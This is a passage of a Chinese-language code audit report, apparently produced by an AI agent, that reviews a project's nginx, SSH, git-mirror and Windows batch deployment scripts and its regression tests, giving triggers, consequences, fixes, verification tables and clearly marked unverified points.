        ok "nginx 配置已 reload"
    else
        systemctl start nginx
        ok "nginx 已启动"
    fi
```
```bash
echo
ok "部署完成！"
echo
```
- 触发条件：`nginx -t` 只校验语法，不检测端口冲突。当 `LOG_VIEWER_PORT` 被设为与其它进程冲突的端口（例如用户把它改成 8000/80，或与同机其它站点冲突）时，`nginx -t` 通过，而 `systemctl start nginx` 因 `bind() to 0.0.0.0:<port> failed (98: Address already in use)` 失败；`systemctl start` 的失败码在 `if/else` 分支体内会触发 `set -e` 直接退出，但脚本并未在此处设置任何 `err`/非 0 汇总；更常见的是 nginx 早已 active、`reload` 因新配置的冲突端口失败（`reload` 失败时旧配置继续服务，脚本仍打印 `ok "nginx 配置已 reload"`）。
- 后果：脚本结束语是醒目的 `[OK] 部署完成！`，且全文没有把"探测到的失败"汇总成退出码。CI/自动化若以退出码判定，会把一个"日志查看器端口没监听、站点仍是旧配置"的部署当成成功；若 nginx 根本没起来（全新机器），用户访问 80 端口直接失败，而脚本输出里满是 `[OK]`，误导排查方向（作者已在 570-581 行实现了"80 端口不应返回默认欢迎页"的校验，却没有把校验结果转成退出码）。
- 修复建议：
  1) 维护一个 `DEPLOY_WARNINGS`/`FAILED` 计数：所有"降级继续"的分支（nginx start/reload、service 未激活、探测失败）都累加，收尾时若非 0 则打印汇总并以非 0 退出（或至少提供 `--strict` 开关）；
  2) `reload`/`start` 后立刻做功能探针并把结果并入汇总：`curl -sS -o /dev/null -w '%{http_code}' --max-time 5 http://127.0.0.1:${LV_PORT}/` 与 `http://127.0.0.1/api/health`，任一非 2xx/3xx 即计入失败；
  3) `nginx -t` 之后增加端口可用性预检：`ss -ltn "sport = :${LV_PORT}"` 为空才继续，否则 `err` 并提示改 `LOG_VIEWER_PORT`。

### [P3] X-25 `migrate-server.sh` / `quick-sync.sh` 的 SSH 选项与凭据处理：密钥路径在命令行可见、无 `-o BatchMode`、端口未校验

- 位置：`scripts/migrate-server.sh:109-123`、`scripts/migrate-server.sh:85-86`、`scripts/quick-sync.sh:64`
- 代码：
```bash
SSH_OPTS="-p $SSH_PORT -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10"
if [[ -n "$SSH_KEY" ]]; then
    SSH_OPTS="$SSH_OPTS -i $SSH_KEY"
fi

RSYNC_SSH="ssh $SSH_OPTS"
...
check_remote_command() {
    local host="$1"
    local cmd="$2"
    ssh $SSH_OPTS "$host" "command -v $cmd >/dev/null 2>&1" 2>/dev/null
}
```
```bash
        --ssh-port)   SSH_PORT="$2"; shift 2 ;;
        --ssh-key)    SSH_KEY="$2"; shift 2 ;;
```
```bash
            rsync -avz --progress -e "ssh -o StrictHostKeyChecking=accept-new" "$src" "$REMOTE:$dst"
```
- 触发条件：
  1) `--ssh-key PATH` 与 `--install-dir`（X-03）同样未经转义地拼进字符串并被 `ssh`/`rsync` 以 `$SSH_OPTS`（**未加引号**）展开；含空格的密钥路径（Windows 挂载目录、`/home/First Last/.ssh/id_rsa`）会被拆成两个参数，`ssh` 静默改用默认密钥或直接认证失败。
  2) 未设置 `-o BatchMode=yes`，`ssh` 在密钥不可用时会回退到交互式密码/口令提示；脚本以 root 运行且可能无人值守，表现为"卡住等待输入"（`deploy-linux.sh:19-21` 专门用 `exec 0</dev/null` 治理过同类问题，本脚本没有）。
  3) `--ssh-port` 未做数字/范围校验（同 X-21），`-p abc` / `-p 99999` 的报错晦涩。
  4) `quick-sync.sh` 完全不支持自定义端口与密钥，只用 `-e "ssh -o StrictHostKeyChecking=accept-new"`，在非 22 端口的服务器上无法工作，且 `--help` 文本未说明该限制。
- 后果：迁移在高安全环境（禁用密码登录、非标准端口、密钥带口令）中静默挂起或认证失败；`StrictHostKeyChecking=accept-new` 在首次连接时自动信任任意主机密钥，配合"以 root 推送 `.env`"的流程，若 DNS/中间人劫持了 `user@new-server-ip` 的解析，密钥会被送往攻击者主机（`accept-new` 只防后续变更，不防首次）。
- 修复建议：
  1) 改为 bash 数组并统一传递：`SSH_OPTS=(-p "$SSH_PORT" -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10)`，调用处 `ssh "${SSH_OPTS[@]}" "$host" ...`、`rsync -e "ssh ${SSH_OPTS[*]}"`；
  2) 首次连接改为"先打印目标指纹并要求确认"或允许传入已知 `known_hosts` 文件（`-o UserKnownHostsFile=`），关键生产迁移不应使用 `accept-new` 静默信任；
  3) 校验 `SSH_PORT` 范围；`quick-sync.sh` 增加 `--ssh-port`/`--ssh-key` 或明确在文档中标注"仅支持 22 端口 + 默认密钥"。

### [P3] X-26 `deploy/README.md` 的镜像/代理建议无法覆盖内网主机，且回滚章节给出的命令不完整

- 位置：`deploy/README.md:40-44`、`deploy/README.md:232-238`
- 代码：
```markdown
> - 或让本机后续所有 git 操作自动走镜像（之后普通 `git clone` / `git pull` 即可，update-from-github.sh 的 pull 同样受益）：
>   `git config --global url."https://ghproxy.net/https://github.com/".insteadOf "https://github.com/"`
```
```markdown
```bash
# 当前代码目录改名，把 _backup 里最近的完整复制回来，再 restart 即可
sudo -u gipfel cp /opt/gipfel/_backup/2025-08-31_1200/db.sqlite3 /opt/gipfel/backend/
sudo systemctl restart gipfel
```
```
- 触发条件：第一条建议用 `git config --global` 写入 `root` 的全局配置（脚本以 sudo 运行），它会把**所有** `https://github.com/` 请求改写到第三方代理域名；而 `scripts/update-from-github.sh:131` 又在运行时**再次**打印同一条建议，等于把"改全局 git 配置指向第三方镜像"作为标准操作推荐。第二条"回滚"章节的命令由 `sudo -u gipfel cp ... && sudo systemctl restart gipfel` 组成：`sudo -u gipfel` 在 `cp` 目标为 `/opt/gipfel/backend/` 时要求 `gipfel` 对该目录可写（`deploy-linux.sh:437` 的 `chown -R gipfel:gipfel` 之后确实可写，但若上次部署中途失败则可能不可写），且注释里的日期戳需要人工替换。
- 后果：① 全局 `insteadOf` 把 git 流量（含 `Authorization` 头与私有仓库凭据）交给第三方代理域名，代理可记录/篡改代码，而脚本注释只提醒"镜像可用性随时间变化"，未提示信任风险与回滚该配置的方法（`git config --global --unset`）；② 回滚章节按文档执行只恢复数据库、不恢复代码与 `frontend-dist`（与 X-10 同源），运维按文档"回滚"后仍在跑新版代码，得到"数据和代码版本不匹配"的更复杂故障；`cp` 失败也只输出 cp 的错误，无校验。
- 修复建议：
  1) 镜像建议改为**按仓库**而非全局：`git config url."https://ghproxy.net/https://github.com/".insteadOf "https://github.com/"`（去掉 `--global`，仅在 clone 目录内生效），并补充"谨慎使用第三方代理，凭据与代码内容会经其转发；用毕 `git config --unset url.<mirror>.insteadOf` 撤销"；
  2) 回滚章节补全为完整步骤：先 `sudo git -C /opt/gipfel rev-parse HEAD` 记录当前版本 → `sudo git -C /opt/gipfel checkout <上一个 tag/commit>`（或从 `_backup` 恢复代码）→ `pip install -r requirements.txt` → `cd frontend && npm ci && npm run build` → `manage.py migrate <app> <上一个迁移名>`（如需）→ `systemctl restart gipfel gipfel-logviewer`，并给出数据库回滚前的 `cp -a db.sqlite3 db.sqlite3.bak` 保护步骤；
  3) 用 `git revert` + 重新部署替代"手工挑文件"，并在文档里说明 `_backup/*` 只含数据不含代码。

### [P2] X-28 `bootstrap-dev.bat` 的保窗守卫用裸 `shift`，cmd 下 `%0` 被一起移走 → 之后的 `%~dp0` 变成"第一个参数"，`--no-keep-open` 必然失败

- 位置：`scripts/bootstrap-dev.bat:60-61`（`shift`）、`scripts/bootstrap-dev.bat:65-68`（受影响的 `%~dp0`）、`scripts/bootstrap-dev.bat:179`（`gen_logviewer_key.py` 调用）、`tests/fix_verify/scripts/test_x18_bootstrap_guard.py:66`（把该写法断言为"必须存在"的测试）
- 代码（改前，`a6b4306` 引入）：
```bat
:guard_done
if /i "%~1"=="--no-keep-open" shift
if /i "%~1"=="__kept__" shift

setlocal
chcp 65001 >nul
cd /d "%~dp0"

set "BACKEND=%~dp0..\backend"
set "FRONTEND=%~dp0..\frontend"
```
```bat
"%PY%" "%~dp0gen_logviewer_key.py"
```
- 触发条件：**cmd 的 `shift` 与 bash 的不同——它会把 `%0` 也一起移掉**，于是 `%~dp0` 从"脚本所在目录"变成"第一个参数"。本机 cmd.exe 实测（`bootstrap-dev.bat --no-keep-open --skip-frontend`）：
```
BEFORE: 0=["...\scripts\bootstrap-dev.bat"]  1=[--no-keep-open]  dp0=[...\Web\scripts\]
AFTER1: 0=[--no-keep-open]                   1=[--skip-frontend] dp0=[...\Web\]
AFTER2: 0=[--skip-frontend]                  1=[]                dp0=[...\Web\]
```
  只要传了 `--no-keep-open`（文档第 26-27 行明确推荐给 CI/自动化使用的开关），`%~dp0` 就解析到**仓库的上一级**，`BACKEND` 随之变成 `...\GipfelBusinessCompetitionManagerWeb\..\backend`。实测退出码 1 与报错：
```
[ERROR] missing ...\GipfelBusinessCompetitionManagerWeb\..\backend\requirements.txt
[ERROR] Bootstrap FAILED. See messages above.
bat exit=1
```
  历史版本（`%~dp0..\backend\gen_logviewer_key.py` 相对写法）症状更隐蔽：`cd /d "%BACKEND%"` 之后相对路径从 cwd 解析，直接报
  `can't open file '...\backend\gen_logviewer_key.py': [Errno 2] No such file or directory`，
  被上层显示成 `[ERROR] failed to ensure LOGVIEWER_SECRET_KEY` —— **真正原因（路径基准被 shift 破坏）完全不提示**。
- 后果：① `--no-keep-open` 这条**专门为 CI 准备**的路径 100% 不可用，实测在依赖自检阶段即中止，`--print-seed-password`/`--allow-partial` 等后续步骤根本走不到；② 同一次 `shift` 还影响守卫之后的全部 `cd /d "%~dp0"`（成功/失败两条收尾分支），使"结束后回到脚本目录，方便用户接着双击 start-dev.bat"的意图失效；③ 触发条件与"参数个数"耦合，无参双击正常、带该开关必挂，极易被当成环境问题。
- 修复建议：
  1) **在任何 `shift` 之前固化脚本目录**，之后一律使用它：`set "SCRIPT_DIR=%~dp0"` 放在保窗守卫之前，并把 `cd /d "%~dp0"`、`BACKEND`、`FRONTEND`、`"%PY%" "%~dp0gen_logviewer_key.py"` 全部改为 `%SCRIPT_DIR%`（已按此修复）；
  2) 若确实需要 shift 语义，用 `shift /1` 只移动位置参数、保留 `%0`（需 cmd 扩展启用），但不要再依赖 `%~dp0` 表达"脚本目录"；
  3) 把"shift 会吃掉 `%0`"写进文件顶部的维护规则（已加为第 5 条），并加回归断言：**`shift` 之后不得再出现 `%~dp0`**，且 `SCRIPT_DIR` 的固化必须早于守卫块；
  4) 原回归测试 `test_no_keep_open_path_runs_inline` 断言的恰是 buggy 写法（`assertIn('...--no-keep-open" shift')`），等于把缺陷锁死、无人敢改——已改为断言行为，并新增 `test_script_dir_is_captured_before_any_shift`、`test_paths_use_the_captured_script_dir`；
  5) X-18 的运行时回归**无法发现本缺陷**：它用的是"收窄 PATH 的空壳目录"，脚本在环境检查处就失败退出 1，而测试只断言 `RC_A1=1`/`RC_A2=1`，对"在哪一步失败"不敏感——失败的**原因**被掩盖了，建议补一条真实参数路径的端到端断言。
- 验证（本机 cmd.exe，修复后）：

| 调用 | 改前 | 改后 |
| --- | --- | --- |
| `--no-keep-open --skip-frontend` | exit=1，`missing ...\..\backend\requirements.txt` | **exit=0，跑完全程** |
| `--skip-frontend`（等价双击无参） | exit=0 | **exit=0** |
| `[OK] LOGVIEWER_SECRET_KEY already set` | 未到达 | **到达** |
| `backend/db.sqlite3`、`backend/.env` 哈希 | — | **未变**（幂等，无副作用） |

  静态自检同步通过：纯 ASCII（非 ASCII 字节 0）、CRLF（LF=248/CRLF=248）、代码区括号配平（38/38）、无引号奇偶失衡行、`goto` 目标全部存在；`python tests/fix_verify/scripts/test_x18_bootstrap_guard.py` → **Ran 8 tests, OK**。

### [P2] X-29 三处回归用例本身失真：X-20 断言"必须 CRLF"（X-27 之后恒失败）、X-17/X-19 用 UTF-8 硬解 GBK 输出致中文断言永不匹配

> 本轮是**合并 `origin/master` 16 个提交**时暴露出来的：先按"以 master 为主"解决 8 个冲突块后，
> `tests/fix_verify/scripts` 下 6 个文件转红。逐项归因发现其中 **3 个文件与本次合并无关**——
> 它们在合并前就已是红的（X-20 自 `179712f` 起、X-17/X-19 在中文 Windows 上一直如此），
> 只是此前没有整目录跑过。合并只是把它们暴露出来。

- 位置：
  - `tests/fix_verify/scripts/test_x20_install_dir.py:102-104`（原 `test_quick_sync_keeps_crlf`）
  - `tests/fix_verify/scripts/test_x17_db_safety.py:55-64`、`:109-117`
  - `tests/fix_verify/scripts/test_x19_start_dev_exit.py:87-95`
- 代码（改前）：
```python
# test_x20 —— 断言的是 X-27 之前的坏状态
def test_quick_sync_keeps_crlf(self):
    raw = QUICK.read_bytes()
    self.assertEqual(raw.count(b"\r\n"), raw.count(b"\n"), "quick-sync.sh 行尾不再是 CRLF")
```
```python
# test_x17 / test_x19 —— 硬按 UTF-8 解码
proc = subprocess.run([...], capture_output=True, text=True,
                      encoding="utf-8", errors="replace", timeout=600)
```
- 触发条件与后果：
  1) **X-20**：评审 X-27 时把 `.sh` 统一强制为 LF（`.gitattributes: *.sh text eol=lf`），
     但提交 `179712f` **只加了 `.gitattributes`、没有同步更新这个断言**。`quick-sync.sh`
     现在是 `LF=315 / CRLF=0`（完全正确），而用例要求 `CRLF == LF` → **恒失败**。
     更糟的是它的失败信息写的是"行尾不再是 CRLF"，会把人**引向错误结论**（以为文件坏了，
     实际是断言在要求错误状态），并掩盖真正的 X-27 修复效果。
  2) **X-17 / X-19**：用例把「被测脚本输出的 UTF-8 字节」与「经 Windows 控制台/cmd.exe
     输出的系统代码页（中文 Windows = GBK）字节」混在一个流里，然后硬按 `encoding="utf-8"`
     解码。GBK 的中文被解成 `\ufffd` 替换符，于是断言里的中文串（如
     `"超精度值必须显式报错"`、正则 `dev\.py --check-only（端口被占）`）**永远匹配不上**。
     实测夹具原始字节：`b'### X-19 \xcc\xbd\xd5\xeb\xa3\xa8after\xa3\xa9'`（`\xcc\xbd\xd5\xeb` = 「探针」的 GBK）。
     表现为"脚本/夹具坏了"，而**被测脚本与夹具完全正常**（直接跑夹具 rc=0、输出齐全）。
- 后果：CI 在中文 Windows 上无法用这套用例判定回归 —— 3 个文件长期假红，真回归会淹没在假红里；
  且 X-20 的假红恰好出现在"行尾"这个已经在生产上出过事故（X-27）的点上，误导性最强。
- 修复建议（已按此修复）：
  1) **X-20**：把断言改为真正要保证的不变量 —— 不得出现任何 CRLF：
     `assertEqual(raw.count(b"\r\n"), 0)`，并加一条"文件非空"兜底；用例改名
     `test_quick_sync_is_lf_only`，docstring 记录"本用例原先断言的是 X-27 之前的坏状态"。
  2) **X-17 / X-19**：新增 `tests/fix_verify/scripts/_decoding.py`，提供
     `decode_output()`（UTF-8 严格解优先，失败回退 `locale.getpreferredencoding(False)`）
     与 `run_captured()`；两处 `subprocess.run(...text=True, encoding="utf-8")` 改用它。
     这样无论夹具走 PYTHONIOENCODING / 控制台代码页哪条路径，都能拿到可断言的中文。
  3) 建议同类用例统一走 `run_captured`，别再各写一份 `encoding="utf-8"`。
- 验证（本机 Windows，改后）：

| 用例 | 改前 | 改后 |
| --- | --- | --- |
| `test_x20_install_dir.py` | rc=1 `FAILED (failures=1)` | **rc=0 Ran 7 tests OK** |
| `test_x17_db_safety.py` | rc=1 `FAILED (failures=3)` | **rc=0 Ran 6 tests OK** |
| `test_x19_start_dev_exit.py` | rc=1 `FAILED (failures=1)` | **rc=0 Ran 5 tests OK** |

  合并结果另经真 Linux 复核：全部被跟踪 `.sh` 的 `bash -n` **9/9 OK**；
  `code_audit/_wsl_verify.sh` → **PASS=45 FAIL=0**（45 = 原 44 项 + master 新增的 `tests/https-443-diag.sh`）。

---

## 存疑/待确认

1. **[待确认] X-01 的实证**：本会话的沙箱禁止以管道捕获子进程输出，`bash`（Git Bash / WSL）无法启动（`couldn't create signal pipe, Win32 error 5` / `Wsl/EnumerateDistros E_ACCESSDENIED`），因此未能现场执行最小复现。结论依据的是 POSIX/bash 语义：`((expr))` 的退出状态为"表达式值为 0 则 1，否则 0"，`PASS` 初值 0 时 `((PASS++))` 求值为 0 → 返回 1 → 在 `set -e` 下终止。请在 Linux 上执行 `bash -c 'set -e; P=0; f(){ ((P++)); }; f; echo reached'` 复核（预期不打印 `reached`）。

2. **[待确认] `settings.py` 的 ALLOWED_HOSTS 空白容忍**：`scripts/deploy-linux.sh:379` 的幂等判断用 `grep -qE "(^|,)${AH_ENTRY}(,|$)"`，对 `DJANGO_ALLOWED_HOSTS="a.com, 1.2.3.4"`（逗号后有空格）这类人工编辑过的值可能不匹配而重复追加。但 `backend/backend/settings.py:86` 实际做了 `h.strip()`，因此运行期行为正常，仅表现为 `.env` 冗余增长。是否值得修取决于是否接受"人工编辑过的 `.env`"这一场景——本次未按缺陷计入（X-11 已覆盖 `sed &` 的确定性问题）。

3. **[待确认] `deploy-linux.sh:506-511` 的占位符兜底是否会二次替换**：该处在 `_tmp_vhost` 检测到残留 `__LOG_VIEWER_PORT__` 后用 `sed -i "s|...|${LV_PORT}|g"` 兜底。若 `LOG_VIEWER_PORT` 本身的值恰好包含字符串 `__LOG_VIEWER_PORT__`（需人为构造，且 `.env` 解析处已用 `^[0-9]+$` 拦截），理论上会自我替换。因 `_log_viewer_port` 的数字校验先于此处执行，判定为不可达，未计入缺陷。

4. **[待确认] Docker 示例的可信度**：`deploy/README.md:256-283` 的 Dockerfile/挂载示例（含 `-e JWT_SECRET=CHANGE-ME`）是否属于"可执行交付物"还是纯文档示意，本次按文档处理故未计缺陷；若团队按此示例实际部署，`JWT_SECRET=CHANGE-ME` 会被 `backend/backend/settings.py:31-43` 的弱密钥黑名单拦下（黑名单含 `change-me`），但 `-b 0.0.0.0` 的暴露与挂载 `db.sqlite3` 单文件的写一致性问题需要单独评审。

5. **[待确认] 未在真实 Linux/Windows 主机上执行任何脚本**：按任务要求"绝对不要执行这些部署/启动脚本"，所有网络/权限/端口类结论均为静态推演。其中 X-08（端口不一致）、X-22（口令入日志）、X-24（退出码 0）建议在测试机上各做一次最小复现确认现象措辞。
